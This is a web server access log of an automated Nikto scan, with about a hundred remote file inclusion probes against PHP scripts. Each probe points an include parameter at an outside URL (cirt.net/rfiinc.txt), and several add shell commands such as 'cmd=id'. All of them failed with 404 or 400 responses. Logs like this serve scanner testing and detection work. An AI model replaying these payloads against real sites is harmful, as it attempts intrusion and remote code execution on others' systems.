172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_mambowiki/MamboLogin.php?IP=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004497)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_minibb.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004498)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_mosmedia/media.divs.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004499)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_mosmedia/media.tab.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004500)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_mospray/scripts/admin.php?basedir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004501)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004502)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_mp3_allopass/allopass.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004503)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004504)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004505)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004506)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004507)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004508)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004509)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_rsgallery2/rsgallery.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004510)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004511)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004512)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_smf/smf.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004513)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004514)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004515)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004516)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_thopper/inc/request_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004517)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004518)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004519)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004520)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004521)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/core/connect.php?language_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004522)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/minibb/bb_plugins.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004523)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/minibb/index.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004524)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/minibb/index.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004525)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/xmlparser/loadparser.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004526)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /compteur/mapage.php?chemin=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004527)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /conf.php?securelib=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004528)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /conf.php?securelib=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004529)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.inc.php3?rel_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004530)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.inc.php?_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004531)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.inc.php?path_escape=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004532)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.inc.php?path_escape=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004533)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?full_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004534)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?full_path_to_db=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004535)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?fullpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004536)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?incpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004537)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?path_to_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004538)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?rel_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004539)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?rel_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?returnpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004541)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?sql_language=http://cirt.net/rfiinc.txt??&cmd=0wn3d By" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?xcart_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004543)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config.php?xcart_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004544)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config/config_admin.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004545)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config/config_main.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004546)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config/config_member.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004547)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config/dbutil.bck.php?confdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004548)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config/mysql_config.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004549)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /config/sender.php?ROOT_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004550)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /configuration.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004551)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /confirmUnsubscription.php?output=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004552)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /connect.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004553)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /connexion.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004554)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /contact.php?blog_theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004555)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /contacts.php?cal_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004556)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /contenido/external/frontend/news.php?cfg[path][includes]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004557)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /content.php?content=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004558)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /content/admin.php?pwfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004559)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /content/content.php?fileloc=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004560)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /content/delete.php?pwfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004561)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /content/modify.php?pwfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004562)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /content/modify_go.php?pwfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004563)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /contrib/forms/evaluation/C_FormEvaluation.class.php?GLOBALS[fileroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004564)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /contrib/mx_glance_sdesc.php?mx_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004565)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /contrib/phpBB2/modules.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004566)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /controllers/MySQLController.php?baseDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004567)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /controllers/SQLController.php?baseDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004568)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /controllers/SetupController.php?baseDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004569)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /controllers/VideoController.php?baseDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004570)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /controllers/ViewController.php?baseDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004571)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /convert-date.php?cal_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004572)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /convert/mvcw.php?step=1&vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004573)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /convert/mvcw.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004574)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/admin.php?p=admin&absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004575)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/categories.php?categoriesenabled=yes&do=categories&action=del&absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004576)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/categories_add.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004577)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/categories_remove.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004578)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/edit.php?p=admin&do=edit&c=ok&absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004579)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/editdel.php?p=admin&absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004580)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/ftpfeature.php?p=admin&absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004581)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/login.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004582)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/pgRSSnews.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004583)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/showcat.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004584)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/admin/upload.php?p=admin&do=upload&c=ok&absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004585)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/archive_cat.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004586)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/archive_nocat.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004587)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/aural.php?site_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004588)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/aural.php?site_absolute_path=http://cirt.net/rfiinc.txt??&cmd=dir HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004589)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/editor.php?editor_insert_bottom=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004590)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/includes.php?CMS_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004591)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /core/recent_list.php?absoluteurlhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004592)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /corpo.php?pagina=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004593)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cp2.php?securelib=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004594)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cp2.php?securelib=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004595)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cpe/index.php?repertoire_config=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004596)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /crea.php?plancia=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004597)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /creacms/_administration/edition_article/edition_article.php?cfg[document_uri]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004598)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /creacms/_administration/fonctions/get_liste_langue.php?cfg[base_uri_admin]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004599)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /creat_news_all.php?language=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004600)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /create_file.php?target=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004601)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cron.php?ROOT_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004602)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cron.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004603)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004604)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004605)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cross.php?url=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004606)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cross.php?url=http://cirt.net/rfiinc.txt? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /custom_vars.php?sys[path_addon]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004608)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /customer/product.php?xcart_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004609)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cwb/comanda.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004610)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /datei.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004611)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /db/PollDB.php?CONFIG_DATAREADERWRITER=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004612)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /db/mysql/db.inc.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004613)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dbcommon/include.php?_APP_RELATIVE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004614)"
